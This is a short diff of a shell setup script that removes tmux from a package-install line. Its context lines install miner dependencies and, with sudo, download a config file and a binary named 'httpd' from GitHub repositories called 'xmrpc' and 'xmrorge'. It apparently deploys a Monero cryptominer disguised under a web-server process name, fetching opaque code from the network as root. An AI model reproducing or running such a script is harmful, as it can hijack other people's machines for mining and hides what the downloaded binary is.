@@ -19,7 +19,7 @@ fi
 
 
 
-sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux -y
+sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 sudo rm config.json
 sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
 sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
